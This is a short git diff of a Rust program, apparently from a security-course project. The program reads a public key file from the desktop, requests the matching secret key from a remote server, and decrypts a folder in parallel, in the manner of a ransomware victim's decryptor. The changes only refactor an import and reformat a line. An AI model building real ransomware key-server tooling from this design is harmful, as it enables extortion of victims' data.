@@ -5,8 +5,8 @@ use std::path::PathBuf;
 use anyhow::Result;
 
 // use c_monster_co_2ic80::cryptography::encrypt::decrypt_folder;
-use c_monster_co_2ic80::cryptography::chunk::DEBUG_ENABLED;
 use c_monster_co_2ic80::cryptography::decrypt_parallel::decrypt_folder_parallel;
+use c_monster_co_2ic80::debug::DEBUG_ENABLED;
 use c_monster_co_2ic80::debug_log;
 use c_monster_co_2ic80::networking::client::get_key;
 
@@ -49,8 +49,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 async fn run_decryption() -> Result<(), Box<dyn std::error::Error>> {
     let pk_path = desktop_file_path("public_key.donotdelete")?;
     let pk_bytes = fs::read(pk_path)?;
-    let pk = PublicKey::from_slice(&pk_bytes)
-        .ok_or("key has to be 32 bytes")? as PublicKey;
+    let pk = PublicKey::from_slice(&pk_bytes).ok_or("key has to be 32 bytes")? as PublicKey;
 
     let sk = get_key(&pk).await?;
 
